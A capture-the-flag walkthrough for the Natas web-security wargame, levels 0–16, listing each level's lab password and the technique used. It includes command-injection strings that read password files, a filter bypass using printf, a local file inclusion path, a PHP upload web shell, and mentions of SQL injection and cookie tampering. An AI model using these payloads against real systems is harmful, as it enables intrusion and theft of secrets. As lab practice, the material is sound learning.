## Natas Level 0
Inspect
![Alt text](image.png)

## 0 → Level 1
Inspect
```
h4ubbcXrWqsTo7GGnnUMLppXbOogfBZ7
```

## Level 1 → Level 2
http://natas2.natas.labs.overthewire.org/files/
 
Is accessible.
```
G6ctbMJ5Nb4cbFwhpMPSvxGHhQ7I6W8Q
```

## Level 2 → Level 3
http://natas3.natas.labs.overthewire.org/s3cr3t/  
Is accessible.

```
natas4:tKOcJIbzM4lTs8hbCmzn5Zr4434fGZQm
```

## Level 3 → Level 4
I used burp to edit the referer
![Alt text](image-1.png)
```
Z0NsrtIkJoKALBCLi5eqFfcRN82Au2oD 
```

## Level 4 → Level 5
Change coockie value to 1
![Alt text](image-2.png)
```
fOIvE0MDtPTgRhqmmvvAOt2EfXR6uQgR
```

## Level 5 → Level 6
The source indicated we are including a file
```php
include "includes/secret.inc";

    if(array_key_exists("submit", $_POST)) {
        if($secret == $_POST['secret']) {
        print "Access granted. The password for natas7 is <censored>";
    } else {
        print "Wrong secret";
    }
    }
?>

```
So I added to the url path and found the secret there.
![Alt text](image-3.png)
```
jmxSiH3SP6Sonf8dv66ng8v1cIEdjXWr
```
## Level 6 → Level 7
```
Following the description in the comments.
?page=/etc/natas_webpass/natas8
```
```
a6bZCNYwdKqN5cGP11ZdtPg0iImQQhAB 
```

## Level 7 → Level 8
I just reversed this 
```php
$encodedSecret = "3d3d516343746d4d6d6c315669563362";

function encodeSecret($secret) {
    return bin2hex(strrev(base64_encode($secret)));
}

if(array_key_exists("submit", $_POST)) {
    if(encodeSecret($_POST['secret']) == $encodedSecret) {
    print "Access granted. The password for natas9 is <censored>";
    } else {
    print "Wrong secret";
    }
}
?>
```
decode of `3d3d516343746d4d6d6c315669563362` is `==QcCtmMml1ViV3b`  
reverse: `b3ViV1lmMmtCcQ==`  
decode the reverse: `oubWYf2kBq`
```
Sda6t0vkOPkM8YeOZkAGVhFoaplvlJFd
```

## Level 8 → Level 9
I wrote this in the search bar
```bash
k ;cat /etc/natas_webpass/natas10; echo
```
```
D44EcsFkLxPIkAAKLosx8z3hxX1Z4MCE
```

## Level 9 → Level 10
; is not allowed but the ascii value if ; is 3B so I wrote
```bash
k $(printf "\\x3B") cat /etc/natas_webpass/natas11 $(printf "\\x3B") echo
```
```
1KFqoJXi6hRaPluAmk8ESDW4fSysRoIg
```

## Level 10 → Level 11
Data is loaded from cookies

```php
function loadData($def) {
    global $_COOKIE;
    .
    .
    .
    $tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE["data"])), true);
    .
    .
    .
}

$data = loadData($defaultdata);
```
I needed to reverse the encryption. Initially, I had the color 0xffffff. After decoding the saved data of the cookie and changing it to 0x000000, I observed the difference.
```
for 0xffffff
0l;$$98-8=?#9*jvi 'ngl*+(!$#9lrnh(.*-(.n67
for 0x000000
0l;$$98-8=?#9*jvi 'ngl*+(!$#9lrnh~x|{~xn67
```
It's easy to notice that the changed characters were `~x|{~,` and the repeated key is also quite apparent.
```php 
function xor_encrypt($in) {
    $key = '<censored>';
    $text = $in;
    $outText = '';

    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
    $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}
```
Breaking the encryption was straightforward because of the property that if a ^ b = c, then a ^ c = b. You can access the Python script [here](./natas11/reverse.py) that I used to re-encrypt it, edit the cookie, and obtain the solution.

```
pass
YWqo0pjpcXzSIl5NMAVxg12QxeC1w9QG
```
## Level 11 → Level 12
In this challenge, I was tasked with uploading a file, as shown below:   
![Alt text](image-4.png)   
After uploading the file, the system provided me with a link to access the uploaded file. My objective was to write a PHP script to retrieve and display the contents of the password file, essentially achieving Remote Code Execution (RCE).

I used Burp to modify the file's content and turned it into a PHP script. The transformation looked like this:

I used burp to edit the file content to php script.

From this
![Alt text](image-5.png)
To this:
![Alt text](image-6.png)


```php
<?php
$fileContents = file_get_contents('/etc/natas_webpass/natas13');
if ($fileContents === false) {
    echo 'Failed to read the file.';
} else {
    echo $fileContents;
}
?>
```
```
pass
lW3jYRI02ZKDBb8VtQBU1f6eDRo6WEj9
```

## Level 12 → Level 13
Same as above but now it prevents none image file by adding.

```php
else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {
        echo "File is not an image";
    }
```
According to the function documentation
```
exif_imagetype() reads the first bytes of an image and checks its signature.
```
So I just left the first byte to be an image magic.

```
pass
qPazSJBmrmU7UQJv17MHk1PGC4DxZMEP
```

## Level 13 → Level 14
Simple SQL injection you can find the solution in as a [python script](./natas14/e.py)
```
pass
TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB
```
## Level 14 → Level 15
Sulotion [here](./natas15/e.py)

TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V

## Level 15 → Level 16
For this challenge. My solution was:
1. Cat password file to temp.
2. Give it 777 permissions
3. Access level 9 where it was much easier running commands 
4. print this file.
XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd
